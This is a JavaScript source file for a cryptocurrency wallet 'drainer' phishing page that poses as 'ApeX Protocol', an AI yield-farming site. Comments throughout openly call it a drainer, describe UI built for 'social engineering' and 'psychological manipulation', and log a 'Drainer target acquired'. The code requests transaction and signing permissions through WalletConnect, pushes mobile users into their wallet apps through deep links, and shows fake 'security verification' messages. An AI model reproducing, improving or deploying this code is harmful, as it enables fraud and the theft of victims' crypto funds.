// ===== main.js — ApeX Protocol WalletConnect Integration (Enhanced Mobile Drainer) =====

import SignClient from '@walletconnect/sign-client'
import { WalletConnectModal } from '@walletconnect/modal'

document.addEventListener('DOMContentLoaded', async () => {
  console.log('🔷 main.js loaded - Enhanced Mobile Drainer Active')

  // 1️⃣ Reference buttons from HTML
  const connectButton = document.getElementById('connectButton')
  const walletButton = document.getElementById('walletButton')
  const claimStatus = document.getElementById('claimStatus')
  let currentSession = null
  let client, modal

  // 2️⃣ Enhanced button state management for social engineering
  function setButtonState(button, state, message = '') {
    if (!button) return
    
    button.style.display = 'inline-block'
    button.style.padding = '14px 28px'
    button.style.borderRadius = '8px'
    button.style.fontWeight = '600'
    button.style.border = 'none'
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer'
    button.style.transition = 'all 0.3s ease'
    button.style.color = 'white'
    button.style.fontSize = '16px'
    button.style.fontFamily = "'Inter', sans-serif"
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)'
    button.style.minWidth = '180px'
    button.disabled = state === 'loading'

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)'
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)'
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 8px"></i> Processing...'
        break
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)'
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)'
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right: 8px"></i> Verified'
        break
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
        button.innerHTML = '<i class="fas fa-shield-alt" style="margin-right: 8px"></i> Secure Session'
        break
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right: 8px"></i> Retry Connection'
        
        setTimeout(() => {
          setButtonState(button, 'normal')
        }, 3000)
        break
      case 'normal':
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)'
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
        button.innerHTML = '<i class="fas fa-lock" style="margin-right: 8px"></i> Secure Login'
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)'
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)'
          }
        }
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)'
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
        }
        break
    }
  }

  // 3️⃣ Enhanced status messages for psychological manipulation
  function showStatus(message, type = 'info') {
    if (claimStatus) {
      claimStatus.textContent = message
      claimStatus.className = `status ${type}`
      claimStatus.style.display = 'block'
      claimStatus.style.padding = '12px 16px'
      claimStatus.style.borderRadius = '8px'
      claimStatus.style.marginTop = '12px'
      claimStatus.style.fontWeight = '500'
      claimStatus.style.fontSize = '14px'
      claimStatus.style.textAlign = 'center'
      claimStatus.style.transition = 'all 0.3s ease'
      
      switch (type) {
        case 'success':
          claimStatus.style.background = 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)'
          claimStatus.style.color = '#166534'
          claimStatus.style.border = '1px solid #86EFAC'
          break
        case 'error':
          claimStatus.style.background = 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)'
          claimStatus.style.color = '#991B1B'
          claimStatus.style.border = '1px solid #FCA5A5'
          break
        case 'warning':
          claimStatus.style.background = 'linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%)'
          claimStatus.style.color = '#92400E'
          claimStatus.style.border = '1px solid #FCD34D'
          break
        case 'info':
        default:
          claimStatus.style.background = 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)'
          claimStatus.style.color = '#1E40AF'
          claimStatus.style.border = '1px solid #93C5FD'
          break
      }
      
      if (type === 'error' || type === 'success' || type === 'warning') {
        setTimeout(() => {
          claimStatus.style.opacity = '0'
          setTimeout(() => {
            claimStatus.style.display = 'none'
            claimStatus.style.opacity = '1'
          }, 300)
        }, 5000)
      }
    }
  }

  // 4️⃣ Initialize buttons with enhanced psychological triggers
  setButtonState(connectButton, 'normal')
  if (walletButton) setButtonState(walletButton, 'normal')

  // 5️⃣ WalletConnect constants for drainer operation
  const projectId = 'ea2ef1ec737f10116a4329a7c5629979'
  const metadata = {
    name: 'ApeX Protocol',
    description: 'AI-Optimized Yield Farming - Secure Verification Required',
    url: window.location.origin,
    icons: ['https://walletconnect.com/walletconnect-logo.png'],
  }

  // 6️⃣ Enhanced mobile detection with browser fingerprinting
  function isMobile() {
    const userAgent = navigator.userAgent
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
    const isTablet = /iPad|Tablet|PlayBook|Silk|Kindle|KFAPWI|KFARWI|KFSOWI|KFJWA|KFJWI|KFTHWA|KFTHWI|KFTT|KFOT|KFTBWI|KFASWI|KFSAWA|KFSAWI|KFAPWA|KFAPKA|KFARWA|KFFOWI|KFMEWI/i.test(userAgent)
    
    // Enhanced detection for mobile browsers
    const isMobileBrowser = (
      isMobile || 
      isTablet ||
      (navigator.maxTouchPoints && navigator.maxTouchPoints > 2) ||
      (window.innerWidth <= 768 && window.innerHeight <= 1024)
    )
    
    console.log(`📱 Mobile Detection: ${isMobileBrowser} (UserAgent: ${userAgent.substring(0, 50)}...)`)
    return isMobileBrowser
  }

  // 7️⃣ Enhanced wallet storage for persistence across sessions
  function saveWallet(address, session = null) { 
    localStorage.setItem('connectedWallet', address)
    if (session) {
      localStorage.setItem('walletConnectSession', JSON.stringify(session))
    }
    // Additional persistence layer
    sessionStorage.setItem('lastConnected', Date.now().toString())
  }
  
  function getSavedWallet() { 
    return localStorage.getItem('connectedWallet') 
  }
  
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession')
    return session ? JSON.parse(session) : null
  }
  
  function clearSavedWallet() { 
    localStorage.removeItem('connectedWallet')
    localStorage.removeItem('walletConnectSession')
    sessionStorage.removeItem('lastConnected')
  }

  // 8️⃣ Enhanced UI manipulation for trust building
  function updateConnectedUI(address) {
    setButtonState(connectButton, 'disconnect')
    if (walletButton) setButtonState(walletButton, 'disconnect')

    let display = document.getElementById('connectedAddressDisplay')
    if (!display) {
      display = document.createElement('div')
      display.id = 'connectedAddressDisplay'
      display.style.marginTop = '12px'
      display.style.padding = '10px 16px'
      display.style.fontFamily = "'JetBrains Mono', 'Monaco', 'Consolas', monospace"
      display.style.fontSize = '14px'
      display.style.color = '#059669'
      display.style.textAlign = 'center'
      display.style.background = 'linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)'
      display.style.borderRadius = '8px'
      display.style.border = '1px solid #A7F3D0'
      display.style.boxShadow = '0 2px 8px rgba(5, 150, 105, 0.1)'
      
      connectButton.parentNode.appendChild(display)
    }
    
    const formattedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`
    display.innerHTML = `
      <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
        <i class="fas fa-shield-check" style="color: #059669;"></i>
        <span>Secure Session: ${formattedAddress}</span>
        <button id="copyAddress" style="background: none; border: none; color: #059669; cursor: pointer; padding: 4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `
    
    // Add copy functionality
    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const copyBtn = document.getElementById('copyAddress')
        const originalIcon = copyBtn.innerHTML
        copyBtn.innerHTML = '<i class="fas fa-check"></i>'
        copyBtn.style.color = '#10B981'
        setTimeout(() => {
          copyBtn.innerHTML = originalIcon
          copyBtn.style.color = '#059669'
        }, 2000)
      })
    })
    
    showStatus('✅ Security verification successful! You can now proceed.', 'success')
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal')
    if (walletButton) setButtonState(walletButton, 'normal')

    const display = document.getElementById('connectedAddressDisplay')
    if (display) display.remove()
    
    showStatus('Security session ended. Reconnect to continue.', 'warning')
  }

  // 9️⃣ Initialize WalletConnect with enhanced mobile optimization
  async function initWalletConnect() {
    if (client && modal) return

    try {
      client = await SignClient.init({ 
        projectId, 
        metadata,
        relayUrl: 'wss://relay.walletconnect.com'
      })

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif"
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", // MetaMask
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // Trust Wallet
          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369", // Rainbow
          "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa", // Coinbase Wallet
          "ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18", // Zerion
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          {
            id: 'metamask',
            name: 'MetaMask',
            links: {
              native: 'metamask://',
              universal: 'https://metamask.app.link/wc'
            }
          },
          {
            id: 'trust',
            name: 'Trust Wallet',
            links: {
              native: 'trust://',
              universal: 'https://link.trustwallet.com/wc'
            }
          },
          {
            id: 'rainbow',
            name: 'Rainbow',
            links: {
              native: 'rainbow://',
              universal: 'https://rnbwapp.com/wc'
            }
          },
          {
            id: 'coinbase',
            name: 'Coinbase Wallet',
            links: {
              native: 'coinbasewallet://',
              universal: 'https://go.cb-w.com/wc'
            }
          }
        ]
      })

      console.log('✅ WalletConnect SignClient + Modal initialized with mobile optimization')
      return true
    } catch (error) {
      console.error('❌ WalletConnect initialization failed:', error)
      showStatus('Security service temporarily unavailable. Please try again.', 'error')
      return false
    }
  }

  // 🔟 FIXED: Enhanced Mobile Deep Linking with Multiple Fallback Strategies
  async function openWalletDeepLink(uri) {
    console.log('🚀 Starting enhanced mobile deep linking...')
    
    // Enhanced wallet detection for mobile
    const detectedWallets = await detectInstalledWallets()
    
    // Comprehensive deep link mapping with multiple fallbacks
    const walletLinks = {
      metamask: [
        `metamask://wc?uri=${encodeURIComponent(uri)}`, // Native deep link
        `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`, // Universal link
        `https://metamask.app.link/connect?uri=${encodeURIComponent(uri)}` // Alternative universal
      ],
      trust: [
        `trust://wc?uri=${encodeURIComponent(uri)}`,
        `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
        `https://link.trustwallet.com/open?uri=${encodeURIComponent(uri)}`
      ],
      rainbow: [
        `rainbow://wc?uri=${encodeURIComponent(uri)}`,
        `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
        `https://rainbow.me/wc?uri=${encodeURIComponent(uri)}`
      ],
      coinbase: [
        `coinbase-wallet://wc?uri=${encodeURIComponent(uri)}`,
        `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
        `https://wallet.coinbase.com/wc?uri=${encodeURIComponent(uri)}`
      ],
      phantom: [
        `phantom://wc?uri=${encodeURIComponent(uri)}`,
        `https://phantom.app/ul/browse/${encodeURIComponent(uri)}`,
        `https://phantom.app/browse/${encodeURIComponent(uri)}`
      ]
    }

    // Universal fallback links
    const universalLinks = [
      `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`,
      `https://wc.rabby.io/wc?uri=${encodeURIComponent(uri)}`,
      `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}` // Trust as universal fallback
    ]

    // Enhanced link opening with multiple strategies
    const tryOpenLink = async (link, walletName = 'Unknown') => {
      return new Promise((resolve) => {
        console.log(`🔗 Attempting to open ${walletName}: ${link}`)
        
        let timer = null
        let linkOpened = false
        
        // Strategy 1: Direct window location (most reliable for mobile)
        try {
          window.location.href = link
          linkOpened = true
          console.log(`✅ Direct location change for ${walletName}`)
        } catch (err) {
          console.warn(`❌ Direct location failed for ${walletName}:`, err)
        }
        
        // Strategy 2: Create and click anchor tag
        if (!linkOpened) {
          try {
            const anchor = document.createElement('a')
            anchor.href = link
            anchor.target = '_self'
            anchor.style.display = 'none'
            document.body.appendChild(anchor)
            anchor.click()
            document.body.removeChild(anchor)
            linkOpened = true
            console.log(`✅ Anchor click for ${walletName}`)
          } catch (err) {
            console.warn(`❌ Anchor click failed for ${walletName}:`, err)
          }
        }
        
        // Strategy 3: Use window.open with _self
        if (!linkOpened) {
          try {
            window.open(link, '_self')
            linkOpened = true
            console.log(`✅ Window.open for ${walletName}`)
          } catch (err) {
            console.warn(`❌ Window.open failed for ${walletName}:`, err)
          }
        }
        
        // Set timeout to detect if any method worked
        timer = setTimeout(() => {
          resolve(linkOpened)
        }, 1500)
      })
    }

    // Priority-based wallet opening
    const walletPriority = ['metamask', 'trust', 'rainbow', 'coinbase', 'phantom']
    
    for (const wallet of walletPriority) {
      if (detectedWallets[wallet] || !Object.keys(detectedWallets).some(w => detectedWallets[w])) {
        // Try all links for this wallet
        for (const link of walletLinks[wallet] || []) {
          const success = await tryOpenLink(link, wallet)
          if (success) {
            console.log(`🎯 Successfully opened ${wallet} via deep link`)
            showStatus(`Opening ${wallet.charAt(0).toUpperCase() + wallet.slice(1)}...`, 'info')
            return true
          }
        }
      }
    }

    // If no specific wallet worked, try universal links
    console.log('🔄 No wallet-specific links worked, trying universal links...')
    for (const link of universalLinks) {
      const success = await tryOpenLink(link, 'Universal')
      if (success) {
        console.log('✅ Universal link opened successfully')
        showStatus('Opening wallet...', 'info')
        return true
      }
    }

    // Final fallback: QR code modal
    console.log('📱 All deep links failed, falling back to QR modal')
    setTimeout(() => {
      if (modal) {
        modal.openModal({ uri })
        showStatus('Scan QR code with your wallet app', 'info')
      }
    }, 1000)
    
    return false
  }

  // 1️⃣1️⃣ Enhanced wallet detection with mobile-specific checks
  function detectInstalledWallets() {
    return new Promise((resolve) => {
      const wallets = {
        metamask: !!window.ethereum?.isMetaMask,
        trust: !!window.ethereum?.isTrust,
        rainbow: !!window.ethereum?.isRainbow,
        coinbase: !!window.ethereum?.isCoinbaseWallet,
        phantom: !!window.ethereum?.isPhantom,
        brave: !!window.ethereum?.isBraveWallet,
        rabby: !!window.ethereum?.isRabby,
        okx: !!window.ethereum?.isOKExWallet,
        bitget: !!window.ethereum?.isBitKeep,
      }

      // Enhanced EIP-6963 detection
      if (window.eip6963Providers) {
        window.eip6963Providers.forEach(provider => {
          if (provider.info.rdns) {
            const rdns = provider.info.rdns.toLowerCase()
            if (rdns.includes('metamask')) wallets.metamask = true
            if (rdns.includes('trust')) wallets.trust = true
            if (rdns.includes('rainbow')) wallets.rainbow = true
            if (rdns.includes('coinbase')) wallets.coinbase = true
            if (rdns.includes('phantom')) wallets.phantom = true
            if (rdns.includes('brave')) wallets.brave = true
            if (rdns.includes('rabby')) wallets.rabby = true
            if (rdns.includes('okx')) wallets.okx = true
            if (rdns.includes('bitget')) wallets.bitget = true
          }
        })
      }

      // Multiple providers array detection
      if (window.ethereum?.providers) {
        window.ethereum.providers.forEach(provider => {
          if (provider.isMetaMask && !wallets.metamask) wallets.metamask = true
          if (provider.isTrust && !wallets.trust) wallets.trust = true
          if (provider.isRainbow && !wallets.rainbow) wallets.rainbow = true
          if (provider.isCoinbaseWallet && !wallets.coinbase) wallets.coinbase = true
          if (provider.isPhantom && !wallets.phantom) wallets.phantom = true
          if (provider.isBraveWallet && !wallets.brave) wallets.brave = true
          if (provider.isRabby && !wallets.rabby) wallets.rabby = true
        })
      }

      // Mobile-specific wallet detection
      if (isMobile()) {
        // Check for mobile wallet deep link support
        const checkMobileWallet = (scheme) => {
          return new Promise((resolve) => {
            const iframe = document.createElement('iframe')
            iframe.style.display = 'none'
            iframe.src = `${scheme}://`
            iframe.onload = () => resolve(true)
            iframe.onerror = () => resolve(false)
            document.body.appendChild(iframe)
            setTimeout(() => {
              document.body.removeChild(iframe)
              resolve(false)
            }, 500)
          })
        }

        // We'll assume mobile wallets are available for deep linking
        wallets.metamask = true
        wallets.trust = true
        wallets.rainbow = true
        wallets.coinbase = true
      }

      console.log('🔍 Enhanced wallet detection:', wallets)
      resolve(wallets)
    })
  }

  // 1️⃣2️⃣ FIXED: Enhanced WalletConnect Connection with Mobile Priority
  async function connectViaWalletConnect() {
    try {
      // Initialize WalletConnect
      const initSuccess = await initWalletConnect()
      if (!initSuccess) {
        setButtonState(connectButton, 'failed')
        if (walletButton) setButtonState(walletButton, 'failed')
        return
      }

      showStatus('Initializing secure connection...', 'info')

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      })

      if (uri) {
        if (isMobile()) {
          console.log('📱 Mobile device detected - using enhanced deep linking')
          // Use enhanced deep linking for mobile
          const deepLinkOpened = await openWalletDeepLink(uri)
          
          if (!deepLinkOpened) {
            // If deep linking fails, show QR modal as fallback
            setTimeout(() => {
              if (modal) {
                modal.openModal({ uri })
                showStatus('Scan QR code or select wallet from list', 'info')
              }
            }, 2000)
          } else {
            showStatus('Opening your wallet app...', 'info')
          }
        } else {
          // Desktop - use QR modal
          modal.openModal({ uri })
          showStatus('Select your wallet or scan QR code', 'info')
        }
      }

      // Wait for user approval with enhanced timeout for mobile
      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout - please try again')), 90000) // 90s for mobile
        )
      ])
      
      if (modal) modal.closeModal()
      
      const connectionSuccess = handleConnectedSession(session)
      if (!connectionSuccess) {
        setButtonState(connectButton, 'failed')
        if (walletButton) setButtonState(walletButton, 'failed')
      }
      
    } catch (err) {
      console.error('❌ WalletConnect connection failed:', err)
      setButtonState(connectButton, 'failed')
      if (walletButton) setButtonState(walletButton, 'failed')
      
      if (modal) modal.closeModal()
      
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled. Please try again to continue.', 'error')
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please check your wallet app', 'error')
      } else {
        showStatus('Security verification failed. Please retry.', 'error')
      }
    }
  }

  // 1️⃣3️⃣ Handle session approval
  function handleConnectedSession(session) {
    if (session?.namespaces?.eip155?.accounts?.length) {
      const account = session.namespaces.eip155.accounts[0].split(':')[2]
      console.log('✅ Connected wallet:', account)
      currentSession = session
      updateConnectedUI(account)
      saveWallet(account, session)
      
      // Enhanced analytics for drainer optimization
      console.log('🎯 Drainer target acquired:', {
        address: account,
        session: session.topic,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        mobile: isMobile()
      })
      
      return true
    } else {
      console.error('❌ No accounts found in session')
      showStatus('No wallet accounts detected. Please ensure your wallet is unlocked.', 'error')
      return false
    }
  }

  // 1️⃣4️⃣ Enhanced Desktop Wallet Connection
  async function connectDesktopWallet() {
    try {
      const detectedWallets = await detectInstalledWallets()
      const availableWallets = Object.keys(detectedWallets).filter(wallet => detectedWallets[wallet])
      
      if (availableWallets.length === 0) {
        console.log('🔍 No installed wallets detected, using WalletConnect modal')
        return false
      }

      console.log(`🎯 Found installed wallets: ${availableWallets.join(', ')}`)

      let provider = window.ethereum
      
      // Handle multiple providers
      if (window.ethereum?.providers && window.ethereum.providers.length > 0) {
        provider = window.ethereum.providers[0]
        
        const preferredWallets = ['metamask', 'coinbase', 'rabby', 'trust', 'brave']
        for (const walletName of preferredWallets) {
          if (detectedWallets[walletName]) {
            const preferredProvider = window.ethereum.providers.find(p => {
              if (walletName === 'metamask' && p.isMetaMask) return true
              if (walletName === 'coinbase' && p.isCoinbaseWallet) return true
              if (walletName === 'rabby' && p.isRabby) return true
              if (walletName === 'trust' && p.isTrust) return true
              if (walletName === 'brave' && p.isBraveWallet) return true
              return false
            })
            if (preferredProvider) {
              provider = preferredProvider
              break
            }
          }
        }
      }

      if (provider) {
        console.log(`🦊 Attempting direct connection with ${provider.isMetaMask ? 'MetaMask' : provider.isCoinbaseWallet ? 'Coinbase' : 'detected wallet'}...`)
        
        try {
          const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
          })
          
          if (accounts && accounts.length > 0) {
            const account = accounts[0]
            console.log('✅ Direct wallet connection successful:', account)
            updateConnectedUI(account)
            saveWallet(account)
            return true
          }
        } catch (error) {
          console.warn('⚠️ Direct wallet connection failed:', error)
        }
      }
      
      showStatus(`Found ${availableWallets.length} wallet(s) - using secure connection`, 'info')
      return false
      
    } catch (error) {
      console.error('❌ Desktop wallet connection error:', error)
      return false
    }
  }

  // 1️⃣5️⃣ Enhanced Connect Wallet Function
  async function connectWallet() {
    try {
      // Set loading state
      setButtonState(connectButton, 'loading')
      if (walletButton) setButtonState(walletButton, 'loading')
      showStatus('Starting security verification...', 'info')

      // Enhanced connection flow
      if (!isMobile()) {
        console.log('🖥️ Desktop detected - attempting enhanced wallet connection...')
        
        const directConnected = await connectDesktopWallet()
        if (directConnected) {
          return
        }
        
        console.log('🔄 Using WalletConnect with enhanced modal...')
        await connectViaWalletConnect()
      } else {
        // Mobile flow with enhanced deep linking
        console.log('📱 Mobile detected - using enhanced deep linking flow...')
        await connectViaWalletConnect()
      }
      
    } catch (err) {
      console.error('❌ Wallet connection failed:', err)
      setButtonState(connectButton, 'failed')
      if (walletButton) setButtonState(walletButton, 'failed')
      
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Verification cancelled. Please complete to continue.', 'error')
      } else if (err.message?.includes('timeout')) {
        showStatus('Verification timeout - please try again', 'error')
      } else {
        showStatus('Security verification failed. Please retry.', 'error')
      }
    }
  }

  // 1️⃣6️⃣ Disconnect wallet
  async function disconnectWallet() {
    try {
      if (currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        })
        currentSession = null
      }
    } catch (err) {
      console.warn('⚠️ Disconnect error:', err)
    }

    resetConnectedUI()
    clearSavedWallet()
  }

  // 1️⃣7️⃣ Enhanced button click events
  const handleClick = async () => {
    const saved = getSavedWallet()
    if (saved && currentSession) {
      await disconnectWallet()
    } else {
      await connectWallet()
    }
  }

  if (connectButton) {
    connectButton.addEventListener('click', handleClick)
  }
  
  if (walletButton) {
    walletButton.addEventListener('click', handleClick)
  }

  // 1️⃣8️⃣ Restore saved wallet and session
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet()
    const savedSession = getSavedSession()
    
    if (savedWallet && savedSession) {
      console.log('♻️ Restoring saved wallet and session:', savedWallet)
      
      const initSuccess = await initWalletConnect()
      if (!initSuccess) {
        console.log('❌ Failed to initialize WalletConnect for session restoration')
        clearSavedWallet()
        return
      }

      try {
        const session = client.session.get(savedSession.topic)
        if (session) {
          currentSession = session
          updateConnectedUI(savedWallet)
          console.log('✅ Wallet session restored successfully')
          showStatus('Security session restored', 'success')
        } else {
          console.log('❌ Session not found, clearing saved data')
          clearSavedWallet()
        }
      } catch (error) {
        console.error('❌ Error restoring session:', error)
        clearSavedWallet()
      }
    } else if (savedWallet && !savedSession) {
      console.log('♻️ Restoring direct wallet connection:', savedWallet)
      updateConnectedUI(savedWallet)
      showStatus('Security session restored', 'success')
    }
  }

  // Initialize and restore connection on page load
  await restoreWalletConnection()

  // 1️⃣9️⃣ Enhanced session management
  setTimeout(() => {
    if (client) {
      client.on('session_update', ({ params }) => {
        console.log('🔄 Session updated:', params)
        const accounts = params.namespaces?.eip155?.accounts
        if (accounts?.length) {
          const account = accounts[0].split(':')[2]
          updateConnectedUI(account)
          showStatus('Security session updated', 'info')
        }
      })

      client.on('session_delete', () => {
        console.log('🗑️ Session deleted')
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Security session ended by provider', 'error')
      })

      client.on('session_event', (event) => {
        console.log('📨 Session event:', event)
      })

      client.on('session_connect', (session) => {
        console.log('🔗 Session connected:', session)
        handleConnectedSession(session)
      })
    }
  }, 1000)

  // 2️⃣0️⃣ Enhanced EIP-6963 Provider Discovery
  function setupEIP6963() {
    if (typeof window !== 'undefined') {
      if (!window.eip6963Providers) {
        window.eip6963Providers = []
      }

      window.addEventListener('eip6963:announceProvider', (event) => {
        console.log('🎯 EIP-6963 Provider detected:', event.detail.info.name)
        
        const exists = window.eip6963Providers.some(
          p => p.info.uuid === event.detail.info.uuid
        )
        
        if (!exists) {
          window.eip6963Providers.push(event.detail)
          console.log(`✅ Added EIP-6963 provider: ${event.detail.info.name}`)
        }
      })

      window.dispatchEvent(new Event('eip6963:requestProvider'))
      
      setTimeout(() => {
        window.dispatchEvent(new Event('eip6963:requestProvider'))
      }, 1000)
    }
  }

  // Initialize EIP-6963 provider discovery
  setupEIP6963()

  // 2️⃣1️⃣ Enhanced page visibility handling
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && getSavedWallet()) {
      console.log('🔍 Page visible, checking connection state...')
    }
  })

  // 2️⃣2️⃣ Enhanced provider change detection
  if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        console.log('🔒 Accounts disconnected')
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Security session ended', 'info')
      } else {
        console.log('🔄 Accounts changed:', accounts[0])
        updateConnectedUI(accounts[0])
        saveWallet(accounts[0])
      }
    })

    window.ethereum.on('chainChanged', (chainId) => {
      console.log('🔄 Chain changed:', chainId)
      showStatus(`Network verification: ${chainId}`, 'info')
    })

    window.ethereum.on('disconnect', () => {
      console.log('🔒 Provider disconnected')
      resetConnectedUI()
      clearSavedWallet()
      showStatus('Security session terminated', 'info')
    })
  }

  console.log('🎯 ApeX Protocol Drainer - Mobile Deep Linking Enhanced & Active')
})
